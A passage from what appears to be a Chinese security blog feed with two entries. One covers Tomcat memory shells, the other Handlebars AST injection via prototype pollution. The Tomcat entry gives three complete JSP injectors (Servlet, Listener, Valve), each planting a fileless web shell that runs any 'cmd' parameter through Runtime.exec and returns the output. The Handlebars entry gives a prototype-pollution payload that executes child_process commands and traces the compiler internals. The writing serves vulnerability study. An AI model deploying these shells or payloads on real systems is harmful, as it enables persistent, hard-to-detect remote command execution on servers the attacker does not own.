&#125;</code></pre><p><strong>总结</strong></p><ul><li>在<code>StandardContext</code>的<code>children</code>属性中加入我们定义的<code>wrapper</code></li><li>在<code>servletMappingNames</code>属性中加入我们的<code>servlet</code>映射</li><li>设置<code>servlet</code>的<code>loadOnStartup</code>属性值大于0</li></ul><h4 id="Servlet内存马实例"><a href="#Servlet内存马实例" class="headerlink" title="Servlet内存马实例"></a>Servlet内存马实例</h4><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;AddServlet&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    try &#123;        // 从ServletContext中反射获取ApplicationContext和StandardContext        ServletContext servletContext = request.getSession().getServletContext();        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);        appctx.setAccessible(true);        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);        stdctx.setAccessible(true);        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);        String servletURL = &quot;/cmdServlet&quot;;        String servletName = &quot;CmdServlet&quot;;        Servlet servlet = new Servlet() &#123;            @Override            public void init(ServletConfig servletConfig) &#123;            &#125;            @Override            public ServletConfig getServletConfig() &#123;                return null;            &#125;            @Override            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException &#123;                String cmd = servletRequest.getParameter(&quot;cmd&quot;);                if (&quot;cmd&quot; != null) &#123;                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                    Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);                    String output = s.hasNext() ? s.next() : &quot;&quot;;                    PrintWriter out = servletResponse.getWriter();                    out.println(output);                    out.flush();                    out.close();                &#125;            &#125;            @Override            public String getServletInfo() &#123;                return null;            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;        // 创建wrapper，设置我们的servlet        Wrapper wrapper = standardContext.createWrapper();        wrapper.setName(servletName);        wrapper.setServlet(servlet);        wrapper.setServletClass(servlet.getClass().getName());        // 令loadOnStartup大于0        wrapper.setLoadOnStartup(1);        // 添加到children属性中        standardContext.addChild(wrapper);        // 设置servlet映射        standardContext.addServletMappingDecoded(servletURL, servletName);        response.getWriter().write(&quot;Success&quot;);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h3><h4 id="Listener分类"><a href="#Listener分类" class="headerlink" title="Listener分类"></a>Listener分类</h4><ul><li><p>EventListener（修改属性时触发）</p><ul><li>ServletContextAttributeListener</li><li>ServletRequestAttributeListener</li><li>HttpSessionAttributeListener</li><li>ServletRequestAttributeListener</li></ul></li><li><p>LifecycleListener（在Servlet生命周期中触发）</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul></li></ul><p><code>Listener</code>的种类有很多，但是有些不适用于作为内存马，比如<code>ServletContextListener</code>需要涉及到启动和停止服务器，<code>HttpSessionListener</code>需要设计<code>session</code>的创建和销毁，而<code>ServletRequestListener</code>只涉及到当前请求，所以最适合做内存马的是<code>ServletRequestListener</code></p><h4 id="listenerStart"><a href="#listenerStart" class="headerlink" title="listenerStart"></a>listenerStart</h4><pre><code class="java">package org.apache.catalina.core;public class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    @Override    protected synchronized void startInternal() throws LifecycleException &#123;        ...            if (ok) &#123;                if (!listenerStart()) &#123; // 调用listenerStart()函数                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));                    ok = false;                &#125;            &#125;        ...</code></pre><pre><code class="java">package org.apache.catalina.core;public class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    public boolean listenerStart() &#123;        if (log.isDebugEnabled())            log.debug(&quot;Configuring application event listeners&quot;);        String listeners[] = findApplicationListeners(); // 找到全部Linstener名字        Object results[] = new Object[listeners.length];        boolean ok = true;        for (int i = 0; i &lt; results.length; i++) &#123;            if (getLogger().isDebugEnabled())                getLogger().debug(&quot; Configuring event listener class &#39;&quot; +                    listeners[i] + &quot;&#39;&quot;);            try &#123;                String listener = listeners[i];                results[i] = getInstanceManager().newInstance(listener); // 实例化Linstener            &#125; catch (Throwable t) &#123;                t = ExceptionUtils.unwrapInvocationTargetException(t);                ExceptionUtils.handleThrowable(t);                getLogger().error(sm.getString(                        &quot;standardContext.applicationListener&quot;, listeners[i]), t);                ok = false;            &#125;        &#125;        if (!ok) &#123;            getLogger().error(sm.getString(&quot;standardContext.applicationSkipped&quot;));            return false;        &#125;        List&lt;Object&gt; eventListeners = new ArrayList&lt;&gt;();        List&lt;Object&gt; lifecycleListeners = new ArrayList&lt;&gt;();        for (Object result : results) &#123;            if ((result instanceof ServletContextAttributeListener)                    || (result instanceof ServletRequestAttributeListener)                    || (result instanceof ServletRequestListener)                    || (result instanceof HttpSessionIdListener)                    || (result instanceof HttpSessionAttributeListener)) &#123;                eventListeners.add(result);            &#125;            if ((result instanceof ServletContextListener)                    || (result instanceof HttpSessionListener)) &#123;                lifecycleListeners.add(result); // 把Linstener加入到lifecycleListeners            &#125;        &#125;        eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));        setApplicationEventListeners(eventListeners.toArray());        for (Object lifecycleListener: getApplicationLifecycleListeners()) &#123;            lifecycleListeners.add(lifecycleListener);            if (lifecycleListener instanceof ServletContextListener) &#123;                noPluggabilityListeners.add(lifecycleListener);            &#125;        &#125;        setApplicationLifecycleListeners(lifecycleListeners.toArray());        if (getLogger().isDebugEnabled())            getLogger().debug(&quot;Sending application start events&quot;);        getServletContext();        context.setNewServletContextListenerAllowed(false);        Object instances[] = getApplicationLifecycleListeners();        if (instances == null || instances.length == 0) &#123;            return ok;        &#125;        ServletContextEvent event = new ServletContextEvent(getServletContext()); // 获取ServletContextEvent        ServletContextEvent tldEvent = null;        if (noPluggabilityListeners.size() &gt; 0) &#123;            noPluggabilityServletContext = new NoPluggabilityServletContext(getServletContext());            tldEvent = new ServletContextEvent(noPluggabilityServletContext);        &#125;        for (Object instance : instances) &#123;            if (!(instance instanceof ServletContextListener)) &#123;                continue;            &#125;            ServletContextListener listener = (ServletContextListener) instance;            try &#123;                fireContainerEvent(&quot;beforeContextInitialized&quot;, listener);                if (noPluggabilityListeners.contains(listener)) &#123;                    listener.contextInitialized(tldEvent);                &#125; else &#123;                    listener.contextInitialized(event); // 调用Linstener的contextInitialized()函数                &#125;                fireContainerEvent(&quot;afterContextInitialized&quot;, listener);            &#125; catch (Throwable t) &#123;                ExceptionUtils.handleThrowable(t);                fireContainerEvent(&quot;afterContextInitialized&quot;, listener);                getLogger().error(sm.getString(&quot;standardContext.listenerStart&quot;,                        instance.getClass().getName()), t);                ok = false;            &#125;        &#125;        return ok;    &#125;</code></pre><p>所以这里的重点在于我们怎么把<code>Linstener</code>添加到<code>applicationListeners</code>属性中，通过属性调用找到了<code>addApplicationListener()</code>函数</p><pre><code class="java">package org.apache.catalina.core;public class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    @Override    public void addApplicationListener(String listener) &#123;        synchronized (applicationListenersLock) &#123;            String results[] = new String[applicationListeners.length + 1]; // 获取Listener名字            for (int i = 0; i &lt; applicationListeners.length; i++) &#123;                if (listener.equals(applicationListeners[i])) &#123;                    log.info(sm.getString(&quot;standardContext.duplicateListener&quot;,listener));                    return;                &#125;                results[i] = applicationListeners[i];            &#125;            results[applicationListeners.length] = listener;            applicationListeners = results; // 传入我们的Linstenr        &#125;        fireContainerEvent(&quot;addApplicationListener&quot;, listener);    &#125;</code></pre><p><strong>总结</strong></p><ul><li>直接调用<code>addApplicationListener</code>将我们的<code>Listener</code>添加到<code>StandardContext</code>的<code>applicationListeners</code>属性中</li></ul><h4 id="Listener内存马实例"><a href="#Listener内存马实例" class="headerlink" title="Listener内存马实例"></a>Listener内存马实例</h4><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;AddLinstener&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    try &#123;        // 从ServletContext中反射获取ApplicationContext和StandardContext        ServletContext servletContext = request.getSession().getServletContext();        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);        appctx.setAccessible(true);        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);        stdctx.setAccessible(true);        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);        ServletRequestListener listener = new ServletRequestListener() &#123;            @Override            public void requestDestroyed(ServletRequestEvent sre) &#123;                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();                String cmd = req.getParameter(&quot;cmd&quot;);                if (cmd != null)&#123;                    try &#123;                        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                        Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);                        String output = s.hasNext() ? s.next() : &quot;&quot;;                        Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);                        requestF.setAccessible(true);                        Request request = (Request)requestF.get(req);                        PrintWriter out= request.getResponse().getWriter();                        out.println(output);                        out.flush();                        out.close();                    &#125;                    catch (Exception e) &#123;&#125;                &#125;            &#125;            @Override            public void requestInitialized(ServletRequestEvent sre) &#123;&#125;        &#125;;        standardContext.addApplicationEventListener(listener);        response.getWriter().write(&quot;Success&quot;);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h3><h4 id="Pineline"><a href="#Pineline" class="headerlink" title="Pineline"></a>Pineline</h4><p>在上面的Tomcat执行流程中讲到过<code>Pineline</code>的调用链，每一层的<code>valve</code>都会顺序调用，上层的<code>valve</code>会调用下层的<code>valve</code>，然后每次调用<code>valve</code>的<code>invoke()</code>方法</p><p>比如在<code>StandardHostValve</code>类中是这样调用<code>vavle</code>的<code>invoke()</code>方法的</p><pre><code class="java">Context context = request.getContext(); // 获取StandardContext...context.getPipeline().getFirst().invoke(request, response); // 获取StandardContext的Valve</code></pre><p>然后在每一个<code>invoke()</code>里面又会递归调用</p><pre><code class="java">getNext().invoke(request, response); // 获取StandardContext的下一个Valve</code></pre><p>所以我们只需在<code>standardContext</code>中添加我们的<code>valve</code>，即可注入<code>Valve</code>内存马</p><pre><code class="java">standardContext.getPipeline().addValve(valve);</code></pre><h4 id="Valve内存马实例"><a href="#Valve内存马实例" class="headerlink" title="Valve内存马实例"></a>Valve内存马实例</h4><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Valve&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;AddVavle&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    try &#123;        // 从ServletContext中反射获取ApplicationContext和StandardContext        ServletContext servletContext = request.getSession().getServletContext();        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);        appctx.setAccessible(true);        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);        stdctx.setAccessible(true);        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);        Valve valve = new Valve() &#123;            @Override            public void invoke(Request request, Response response) throws IOException, ServletException &#123;                HttpServletRequest req = request;                String cmd = req.getParameter(&quot;cmd&quot;);                if (cmd != null) &#123;                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                    Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);                    String output = s.hasNext() ? s.next() : &quot;&quot;;                    PrintWriter out = response.getWriter();                    out.println(output);                    out.flush();                    out.close();                &#125;                this.getNext().invoke(request, response);            &#125;            @Override            public boolean isAsyncSupported() &#123; return false; &#125;            @Override            public Valve getNext() &#123; return null; &#125;            @Override            public void setNext(Valve valve) &#123;&#125;            @Override            public void backgroundProcess() &#123;&#125;        &#125;;        standardContext.getPipeline().addValve(valve);        response.getWriter().write(&quot;Success&quot;);    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/bitterzzZZ/MemoryShellLearn">https://github.com/bitterzzZZ/MemoryShellLearn</a></li><li><a href="https://xz.aliyun.com/t/10362">Tomcat 内存马（二）Filter型</a></li><li><a href="https://www.cnblogs.com/haimishasha/p/10740606.html">Tomcat系列(4)——Tomcat 组件及架构详细部分</a></li><li><a href="https://xuanjian1992.top/2019/08/13/Spring-MVC%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(xml%E9%85%8D%E7%BD%AE)/">Spring MVC启动流程分析(xml配置)</a></li><li><a href="https://blog.csdn.net/hao134838/article/details/109746151">从源码分析tomcat如何调用Servlet的初始化</a></li><li><a href="https://www.cnblogs.com/xyylll/p/15463635.html">tomcat内存马原理解析及实现</a></li><li><a href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Handlebars AST注入</title>
      <link href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>详细分析Handlebars AST注入</p></blockquote><span id="more"></span><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210925163678af9e286637ed6de903.png" alt="image-20210925022250921" style="zoom:80%;" /><p><code>handlebars</code>的<code>parser</code>在解析<code>NumberLiteral</code>类型的字符串时会使用<code>Number()</code>函数进行强制转换，正常情况下这个字符串只能数字，但是用过原型链污染我们可以构造一个非数字型的字符串</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\parser.jscase 35:    this.$ = &#123; type: &#39;StringLiteral&#39;, value: $$[$0], original: $$[$0], loc: yy.locInfo(this._$) &#125;;    break;case 36:    this.$ = &#123; type: &#39;NumberLiteral&#39;, value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) &#125;;    break;</code></pre><p>在将AST编译为函数时，<code>handlebars</code>用<code>pushString</code>将字符串传到<code>opcode</code>中，用<code>pushLiteral</code>将数字和布尔值传入到<code>opcode</code>中，而这个<code>opcode</code>就是之后用来构造模板函数的，<code>Literal</code>类型在AST中表示变量的意思，具体可以参考<a href="https://docs.esprima.org/en/latest/syntax-tree-format.html">Esprima语法树标准</a>，所以我们下面我们能够利用的类型有<code>NumberLiteral</code>和<code>BooleanLiteral</code></p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  StringLiteral: function StringLiteral(string) &#123;    this.opcode(&#39;pushString&#39;, string.value); // 字符串使用pushString  &#125;,  NumberLiteral: function NumberLiteral(number) &#123;     this.opcode(&#39;pushLiteral&#39;, number.value); // 数字使用pushLiteral  &#125;,  BooleanLiteral: function BooleanLiteral(bool) &#123;    this.opcode(&#39;pushLiteral&#39;, bool.value);  // 布尔值使用pushLiteral  &#125;,  UndefinedLiteral: function UndefinedLiteral() &#123;    this.opcode(&#39;pushLiteral&#39;, &#39;undefined&#39;);  &#125;,  opcode: function opcode(name) &#123;    this.opcodes.push(&#123;      opcode: name,      args: slice.call(arguments, 1),      loc: this.sourceNode[0].loc    &#125;);  &#125;,</code></pre><p>那么我们如何调用这些函数呢，<code>handlebars</code>在编译语法树时会调用一个叫<code>accept</code>的函数来处理我们的语法树节点，他会调用<code>node.type</code>对应的构造函数来修改<code>opcode</code>，所以我们的重点也可以转换成如何控制<code>accept(node)</code>中<code>node</code>值，且保证解析流程正常进行</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  accept: function accept(node) &#123;    /* istanbul ignore next: Sanity code */    if (!this[node.type]) &#123;      throw new _exception2[&#39;default&#39;](&#39;Unknown type: &#39; + node.type, node);    &#125;    this.sourceNode.unshift(node);    var ret = this[node.type](node); // 调用node.type对应的构造函数    this.sourceNode.shift();    return ret;  &#125;,</code></pre><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><blockquote><p>原文作者采用的payload</p></blockquote><pre><code class="java">const Handlebars = require(&#39;handlebars&#39;);Object.prototype.type = &#39;Program&#39;;Object.prototype.body = [&#123;    &quot;type&quot;: &quot;MustacheStatement&quot;,    &quot;path&quot;: 0,    &quot;params&quot;: [&#123;        &quot;type&quot;: &quot;NumberLiteral&quot;,        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;    &#125;],    &quot;loc&quot;: &#123;        &quot;start&quot;: 0    &#125;&#125;];var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;var template = Handlebars.compile(source);console.log(template(&#123;&#125;));</code></pre><p>大概流程：</p><ol><li>将<code>type</code>修改为<code>Program</code>绕过<code>Lexer</code>解析</li><li>污染<code>Program</code>中的<code>body</code>，注入自定义的<code>AST</code></li><li>在<code>compiler.js</code>文件中找到可用<code>Gadget</code>，此<code>Gadget</code>能够控制<code>accept(node)</code>中<code>node</code>值，原文作者利用的是<code>MustacheStatement</code></li></ol><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><pre><code class="js">compiler.js/ret()    compiler.js/compileInput()        base.js/parse()            base.js/parseWithoutProcessing()            visitor.js/accept()        compiler.js/compile()            compiler.js/accept()                compiler.js/Program()                    compiler.js/MustacheStatement()                        compiler.js/NumberLiteral() &lt;-- 注入payload        javascript-compiler.js/compile()            javascript-compiler.js/createFunctionContext &lt;-- 生成模板函数体        handlebars.runtime.js/create()    runtime.js/ret()        runtime.js/executeDecorators()        anonymous/templateSpec.main()</code></pre><h4 id="解析入口"><a href="#解析入口" class="headerlink" title="解析入口"></a>解析入口</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  function ret(context, execOptions) &#123;    if (!compiled) &#123;      compiled = compileInput(); // 编译输入    &#125;    return compiled.call(this, context, execOptions);  &#125;</code></pre><h4 id="解析AST"><a href="#解析AST" class="headerlink" title="解析AST"></a>解析AST</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  function compileInput() &#123;    var ast = env.parse(input, options), // 获取语法树        environment = new env.Compiler().compile(ast, options),         templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true);    return env.template(templateSpec);  &#125;</code></pre><p>语法树解析</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.jsfunction parse(input, options) &#123;  var ast = parseWithoutProcessing(input, options); // 转化为AST  var strip = new _whitespaceControl2[&#39;default&#39;](options);  return strip.accept(ast); // 解析AST&#125;</code></pre><p>这里的重点是将<code>input.type</code>污染为<code>Program</code>，从而绕过AST的转换阶段</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.jsfunction parseWithoutProcessing(input, options) &#123;  // Just return if an already-compiled AST was passed in.  if (input.type === &#39;Program&#39;) &#123; // 如果已经是转换好的AST就直接返回    return input;  &#125;  _parser2[&#39;default&#39;].yy = yy;  // Altering the shared object here, but this is ok as parser is a sync operation  yy.locInfo = function (locInfo) &#123;    return new yy.SourceLocation(options &amp;&amp; options.srcName, locInfo);  &#125;;  var ast = _parser2[&#39;default&#39;].parse(input); // 否则就调用Lexer解析节点生成AST  return ast;&#125;</code></pre><p>这里是递归解析语法树</p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\visitor.js  accept: function accept(object) &#123;    if (!object) &#123;      return;    &#125;    /* istanbul ignore next: Sanity code */    if (!this[object.type]) &#123;      throw new _exception2[&#39;default&#39;](&#39;Unknown type: &#39; + object.type, object);    &#125;    if (this.current) &#123;      this.parents.unshift(this.current);    &#125;    this.current = object;    var ret = this[object.type](object); // 调用对应的构造函数解析AST    this.current = this.parents.shift();    if (!this.mutating || ret) &#123;      return ret;    &#125; else if (ret !== false) &#123;      return object;    &#125;  &#125;,</code></pre><h4 id="编译环境变量"><a href="#编译环境变量" class="headerlink" title="编译环境变量"></a>编译环境变量</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  function compileInput() &#123;    var ast = env.parse(input, options),         environment = new env.Compiler().compile(ast, options), // 编译环境变量        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true);    return env.template(templateSpec);  &#125;</code></pre><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  compile: function compile(program, options) &#123;    this.sourceNode = [];    this.opcodes = [];    this.children = [];    this.options = options;    this.stringParams = options.stringParams;    this.trackIds = options.trackIds;    options.blockParams = options.blockParams || [];    options.knownHelpers = _utils.extend(Object.create(null), &#123;      helperMissing: true,      blockHelperMissing: true,      each: true,      &#39;if&#39;: true,      unless: true,      &#39;with&#39;: true,      log: true,      lookup: true    &#125;, options.knownHelpers);    return this.accept(program); // 传入accept函数进行处理  &#125;,</code></pre><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  accept: function accept(node) &#123;    /* istanbul ignore next: Sanity code */    if (!this[node.type]) &#123;      throw new _exception2[&#39;default&#39;](&#39;Unknown type: &#39; + node.type, node);    &#125;    this.sourceNode.unshift(node);    var ret = this[node.type](node); // 提取AST对应的type并调用该构造函数    this.sourceNode.shift();    return ret;  &#125;,</code></pre><p>第一次<code>node.type</code>被污染为<code>program</code></p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  Program: function Program(program) &#123; // 利用Program类来自定义类    this.options.blockParams.unshift(program.blockParams);    var body = program.body, // 通过污染body插入我们的恶意代码        bodyLength = body.length;    for (var i = 0; i &lt; bodyLength; i++) &#123;      this.accept(body[i]); // 提取我们的body继续调用accept进行解析    &#125;    this.options.blockParams.shift();    this.isSimple = bodyLength === 1;    this.blockParams = program.blockParams ? program.blockParams.length : 0;    return this;  &#125;,</code></pre><p>第二次<code>node.type</code>为自定义的<code>MustacheStatement</code></p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  MustacheStatement: function MustacheStatement(mustache) &#123;    this.SubExpression(mustache); // 1    if (mustache.escaped &amp;&amp; !this.options.noEscape) &#123;      this.opcode(&#39;appendEscaped&#39;);    &#125; else &#123;      this.opcode(&#39;append&#39;); // 如果没有设置escaped的话就进行append操作    &#125;  &#125;,  SubExpression: function SubExpression(sexpr) &#123;    transformLiteralToPath(sexpr);    var type = this.classifySexpr(sexpr);    if (type === &#39;simple&#39;) &#123;      this.simpleSexpr(sexpr);    &#125; else if (type === &#39;helper&#39;) &#123;      this.helperSexpr(sexpr); // 2    &#125; else &#123;      this.ambiguousSexpr(sexpr);    &#125;  &#125;,  helperSexpr: function helperSexpr(sexpr, program, inverse) &#123;    var params = this.setupFullMustacheParams(sexpr, program, inverse), // 3        path = sexpr.path,        name = path.parts[0];    if (this.options.knownHelpers[name]) &#123;      this.opcode(&#39;invokeKnownHelper&#39;, params.length, name);    &#125; else if (this.options.knownHelpersOnly) &#123;      throw new _exception2[&#39;default&#39;](&#39;You specified knownHelpersOnly, but used the unknown helper &#39; + name, sexpr);    &#125; else &#123;      path.strict = true;      path.falsy = true;      this.accept(path);      this.opcode(&#39;invokeHelper&#39;, params.length, path.original, _ast2[&#39;default&#39;].helpers.simpleId(path));    &#125;  &#125;,  setupFullMustacheParams: function setupFullMustacheParams(sexpr, program, inverse, omitEmpty) &#123;    var params = sexpr.params;    this.pushParams(params); // 4    this.opcode(&#39;pushProgram&#39;, program);    this.opcode(&#39;pushProgram&#39;, inverse);    if (sexpr.hash) &#123;      this.accept(sexpr.hash);    &#125; else &#123;      this.opcode(&#39;emptyHash&#39;, omitEmpty);    &#125;    return params;  &#125;,  pushParams: function pushParams(params) &#123;    for (var i = 0, l = params.length; i &lt; l; i++) &#123;      this.pushParam(params[i]); // 5    &#125;  &#125;,  pushParam: function pushParam(val) &#123;    var value = val.value != null ? val.value : val.original || &#39;&#39;;    if (this.stringParams) &#123;      if (value.replace) &#123;        value = value.replace(/^(\.?\.\/)*/g, &#39;&#39;).replace(/\//g, &#39;.&#39;);      &#125;      if (val.depth) &#123;        this.addDepth(val.depth);      &#125;      this.opcode(&#39;getContext&#39;, val.depth || 0);      this.opcode(&#39;pushStringParam&#39;, value, val.type);      if (val.type === &#39;SubExpression&#39;) &#123;        // SubExpressions get evaluated and passed in        // in string params mode.        this.accept(val);      &#125;    &#125; else &#123;      if (this.trackIds) &#123;        var blockParamIndex = undefined;        if (val.parts &amp;&amp; !_ast2[&#39;default&#39;].helpers.scopedId(val) &amp;&amp; !val.depth) &#123;          blockParamIndex = this.blockParamIndex(val.parts[0]);        &#125;        if (blockParamIndex) &#123;          var blockParamChild = val.parts.slice(1).join(&#39;.&#39;);          this.opcode(&#39;pushId&#39;, &#39;BlockParam&#39;, blockParamIndex, blockParamChild);        &#125; else &#123;          value = val.original || value;          if (value.replace) &#123;            value = value.replace(/^this(?:\.|$)/, &#39;&#39;).replace(/^\.\//, &#39;&#39;).replace(/^\.$/, &#39;&#39;);          &#125;          this.opcode(&#39;pushId&#39;, val.type, value);        &#125;      &#125;      this.accept(val); // 6 很巧妙地将我们的payload再次传入accept函数    &#125;  &#125;,</code></pre><p>第三次<code>node.type</code>为<code>NumberLiteral</code></p><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  StringLiteral: function StringLiteral(string) &#123;    this.opcode(&#39;pushString&#39;, string.value);  &#125;,  NumberLiteral: function NumberLiteral(number) &#123;     this.opcode(&#39;pushLiteral&#39;, number.value); // 将我们的payload识别为Literal而直接转进构造函数  &#125;,  BooleanLiteral: function BooleanLiteral(bool) &#123;    this.opcode(&#39;pushLiteral&#39;, bool.value);   &#125;,  UndefinedLiteral: function UndefinedLiteral() &#123;    this.opcode(&#39;pushLiteral&#39;, &#39;undefined&#39;);  &#125;,</code></pre><p>后面还有一系列对<code>opcode</code>的操作，均为<code>MustacheStatement</code>语法树的编译过程，下图是编译好<code>MustacheStatement</code>语法树之后<code>opcodes</code>的全部操作，而我们的payload就被注入了第一个</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021092516367021e78643cf9a68f7c7.png" alt="image-20210925113821867" style="zoom:80%;" /><h4 id="编译模板"><a href="#编译模板" class="headerlink" title="编译模板"></a>编译模板</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js  function compileInput() &#123;    var ast = env.parse(input, options),         environment = new env.Compiler().compile(ast, options),        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true); // 将我们的环境变量传进去来编译templateSpec    return env.template(templateSpec);  &#125;</code></pre><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js  compile: function compile(environment, options, context, asObject) &#123;    this.environment = environment;    this.options = options;    this.stringParams = this.options.stringParams;    this.trackIds = this.options.trackIds;    this.precompile = !asObject;    this.name = this.environment.name;    this.isChild = !!context;    this.context = context || &#123;      decorators: [],      programs: [],      environments: []    &#125;;    this.preamble();    this.stackSlot = 0;    this.stackVars = [];    this.aliases = &#123;&#125;;    this.registers = &#123; list: [] &#125;;    this.hashes = [];    